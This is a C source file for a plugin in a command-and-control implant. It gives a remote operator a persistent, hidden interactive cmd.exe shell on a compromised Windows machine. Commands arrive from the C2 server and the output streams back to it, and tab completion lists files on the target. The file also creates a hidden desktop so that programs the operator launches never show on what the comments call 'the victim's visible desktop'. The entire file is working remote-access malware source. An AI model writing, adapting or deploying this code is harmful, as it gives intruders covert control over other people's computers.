/*
 * shell.o - persistent interactive cmd.exe shell (line based)
 * ===========================================================
 * The C2 server keeps the operator's arrow-key history + tab completion
 * (readline). It sends each finished line to this plugin, which feeds cmd.exe
 * and streams the output back via a b_thread pump (b_thread gives the spawned
 * thread the BOF TLS so b_* calls work). Fully isolated in its own arena;
 * a crash only kills this plugin thread.
 *
 * In-band completion request from the server:  \x00\x01TAB\x02<prefix>
 * -> answered with POUT_COMPLETE lines + POUT_COMPLETE_END.
 */
#include <windows.h>
#include "../bof.h"

static HANDLE g_proc = NULL, g_in = NULL, g_out = NULL;
static volatile LONG g_quit = 0;
static char g_cwd[MAX_PATH] = "C:\\";
static HDESK g_hdesk = NULL;

/* pump: stream cmd.exe stdout back to the server */
static void pump(void *unused) {
    (void)unused;
    BYTE *buf = (BYTE *)b_malloc(8192);
    DWORD n;
    while (!g_quit && buf && ReadFile(g_out, buf, 8192, &n, NULL) && n > 0) {
        if (b_send(POUT_STREAM, buf, n) < 0) break;
    }
}

/* answer a server tab-completion request */
static void DoComplete(const char *prefix, int plen) {
    char full[MAX_PATH * 2] = {0};
    if (plen > 0 && plen < MAX_PATH) { memcpy(full, prefix, plen); full[plen] = 0; }

    char dir[MAX_PATH * 2] = {0}, base[MAX_PATH * 2] = {0};
    const char *bs = NULL;
    for (const char *q = full; *q; q++) if (*q == '\\' || *q == '/') bs = q;
    if (bs) {
        int dl = (int)(bs - full) + 1;
        memcpy(dir, full, dl); dir[dl] = 0;
        memcpy(base, bs + 1, strlen(bs + 1) + 1);
    } else if (full[0] && full[1] == ':') {
        memcpy(dir, full, 3); dir[3] = 0;
        memcpy(base, full + 2, strlen(full + 2) + 1);
    } else {
        memcpy(dir, g_cwd, strlen(g_cwd) + 1);
        memcpy(base, full, strlen(full) + 1);
    }

    char pat[MAX_PATH * 2];
    wsprintfA(pat, "%s*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) { b_send(POUT_COMPLETE_END, "", 0); return; }
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (fd.cFileName[0] == 0) continue;
        if (base[0] && strncmp(fd.cFileName, base, strlen(base)) != 0) continue;
        char cand[MAX_PATH * 2];
        wsprintfA(cand, "%s%s", dir, fd.cFileName);
        b_send(POUT_COMPLETE, cand, (int)strlen(cand));
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    b_send(POUT_COMPLETE_END, "", 0);
}

/* mirror cmd.exe's cwd for relative completion lookups */
static void TrackCwd(const char *line) {
    if ((line[0] != 'c' && line[0] != 'C') || line[1] != 'd') return;
    if (line[2] != ' ' && line[2] != 0) return;
    const char *arg = line + 2;
    while (*arg == ' ') arg++;
    if (*arg == 0 || *arg == '\\') { memcpy(g_cwd, "C:\\", 4); return; }
    if (arg[1] == ':') { memcpy(g_cwd, arg, strlen(arg) + 1); return; }
    if (arg[0] == '.' && arg[1] == '.') {
        char *p = g_cwd + strlen(g_cwd);
        while (p > g_cwd + 3 && p[-1] == '\\') p--;
        while (p > g_cwd + 3 && p[-1] != '\\') p--;
        *p = 0;
        return;
    }
    size_t l = strlen(g_cwd);
    if (g_cwd[l - 1] != '\\') { strcat(g_cwd, "\\"); }
    strcat(g_cwd, arg);
    size_t n = strlen(g_cwd);
    while (n > 0 && g_cwd[n - 1] == ' ') g_cwd[--n] = 0;
}

void go(char *args, int length) {
    (void)args; (void)length;
    HANDLE r1, w1, r2, w2;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&r1, &w1, &sa, 0)) { b_send(POUT_ERR, "pipe1", 5); return; }
    if (!CreatePipe(&r2, &w2, &sa, 0)) {
        CloseHandle(r1); CloseHandle(w1);
        b_send(POUT_ERR, "pipe2", 5); return;
    }
    SetHandleInformation(w1, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(r2, HANDLE_FLAG_INHERIT, 0);

    /* create a hidden desktop so GUI programs launched from cmd.exe (notepad,
     * calc, mspaint, ...) never pop a window on the victim's visible desktop */
    char desk[40];
    wsprintfA(desk, "WK_HD_%lu", GetCurrentThreadId());
    g_hdesk = CreateDesktopA(desk, NULL, NULL, 0, GENERIC_ALL, NULL);
    DWORD desk_err = GetLastError();
    BOOL use_hidden = (g_hdesk != NULL || desk_err == ERROR_ALREADY_EXISTS);

    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (use_hidden) si.lpDesktop = desk;
    si.hStdInput = r1; si.hStdOutput = w2; si.hStdError = w2;

    char cmdline[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        if (g_hdesk) CloseDesktop(g_hdesk);
        g_hdesk = NULL;
        CloseHandle(r1); CloseHandle(w1); CloseHandle(r2); CloseHandle(w2);
        b_send(POUT_ERR, "CreateProcessA failed", 21);
        return;
    }
    CloseHandle(r1); CloseHandle(w2);
    CloseHandle(pi.hThread);

    g_proc = pi.hProcess;
    g_in  = w1;      /* we write here */
    g_out = r2;      /* cmd writes here */

    b_thread(pump, NULL);
    b_send(POUT_INFO, "\r\n[*] interactive cmd shell up (Ctrl+C / 'exit' to leave)\r\n", 60);

    char *line = (char *)b_malloc(8192);
    while (!g_quit && line) {
        int n = b_gets(line, 8191);
        if (n <= 0) break;

        /* in-band tab-completion request? */
        if (n >= 7 && line[0] == 0 && line[1] == 1 && line[2] == 'T' &&
            line[3] == 'A' && line[4] == 'B' && line[5] == 2) {
            DoComplete(line + 6, n - 6);
            continue;
        }

        TrackCwd(line);
        line[n] = '\r';
        line[n + 1] = '\n';
        DWORD w;
        WriteFile(g_in, line, n + 2, &w, NULL);
    }
    g_quit = 1;
    if (g_proc) TerminateProcess(g_proc, 0);
    if (g_in)  CloseHandle(g_in);
    if (g_out) CloseHandle(g_out);
    if (g_proc) CloseHandle(g_proc);
    if (g_hdesk) CloseDesktop(g_hdesk);
    g_hdesk = NULL;
}
